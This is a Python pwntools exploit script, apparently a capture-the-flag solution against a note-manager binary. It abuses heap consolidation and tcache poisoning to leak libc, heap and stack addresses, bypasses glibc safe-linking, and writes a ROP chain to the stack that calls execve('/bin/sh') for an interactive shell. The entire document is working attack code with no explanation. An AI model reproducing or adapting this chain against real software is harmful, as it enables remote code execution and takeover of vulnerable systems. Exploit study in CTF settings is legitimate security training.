from pwn import *
context.arch = 'amd64'

#r = process("./chall")
#e = ELF("./chall")
#libc = e.libc

#r = remote("172.17.0.2", 9999)
r = remote("127.0.0.1", 24041)
libc = ELF("./libc")

def create_note(data, size=None):
    if size is None:
        size = len(data)+1
    r.sendlineafter(b">> ", b"1")
    r.sendlineafter(b"size: ", str(size).encode())
    r.sendlineafter(b"content: ", data)

def delete_note(idx):
    r.sendlineafter(b">> ", b"2")
    r.sendlineafter(b"index: ", str(idx).encode())

def read_note(idx):
    r.sendlineafter(b">> ", b"3")
    r.sendlineafter(b"index: ", str(idx).encode())

# do hijacking
create_note(b'A', size=0x500) # 0
create_note(b'B', size=0x100) # 1
create_note(b'B', size=0x100) # 2
create_note(b'B', size=0x100) # 3
create_note(b'B', size=0x100) # 4
create_note(b'B', size=0x100) # 5
create_note(b'B', size=0x100) # 6
create_note(b'B', size=0x100) # 7
create_note(b'B', size=0x100) # 8

for i in range(8, 2, -1):
    delete_note(i)
delete_note(0) # free prev
delete_note(2) # fill up tcache
delete_note(1) # merge the chunk with prev
create_note(b'B', size=0x100) # 9
delete_note(1) # free the chunk to tcache

# do the leaking
create_note(b'B'*8, size=0x17) # 10
read_note(10)
r.recvuntil(b'B'*8)
libc_base = u64(r.recv(8)) - 0x00007ffff7e1b100 + 0x00007ffff7c00000
heap_base = u64(r.recv(6)+b'\x00\x00') - 0x290
log.info("libc_base: %#x" % libc_base)
log.info("heap_base: %#x" % heap_base)
environ = libc_base + libc.symbols["environ"]
log.info("environ: %#x" % environ)

ret = libc_base + next(libc.search(asm('ret'), executable=True))
prdi = libc_base + next(libc.search(asm('pop rdi; ret'), executable=True))
prsi = libc_base + next(libc.search(asm('pop rsi; ret'), executable=True))
prdxp = libc_base + next(libc.search(asm('pop rdx; pop rbx; ret'), executable=True))
sh = libc_base + next(libc.search(b'/bin/sh\x00'))
execve = libc_base + libc.symbols['execve']

# overwrite the linked list to leak stack
create_note(b'B'*0x4e8+p64(0x111)+p64((environ-0x10)^((heap_base+0x7a0)>>12))[:6], size=0x500) # 11
create_note(b'B'*8, size=0x100) # 12
create_note(b'B'*8, size=0x100) # 13
read_note(13)
r.recvuntil(b'B'*8)
r.recv(8)
stack_ptr = u64(r.recv(8))
log.info("stack_ptr: %#x" % stack_ptr)
target = (stack_ptr-0x28-0x10-0xf0) & 0xfffffffffffffff0
log.info("target: %#x" % target)

# overwrite the linked list to hijack stack
delete_note(12)
delete_note(11)
create_note(b'B'*0x4e8+p64(0x111)+p64((target)^((heap_base+0x7a0)>>12))[:6], size=0x500) # 14
create_note(b'B'*8, size=0x100) # 15
#gdb.attach(r)
rop = []
rop += [ret, ret]
rop += [prdi, sh]
rop += [prsi, 0]
rop += [prdxp, 0, 0]
rop += [execve]
assert b'\n' not in flat(rop)
create_note(flat(rop), size=0x100) # 16

sleep(1)
# trigger
r.sendlineafter(b">> ", b"4")

r.interactive()
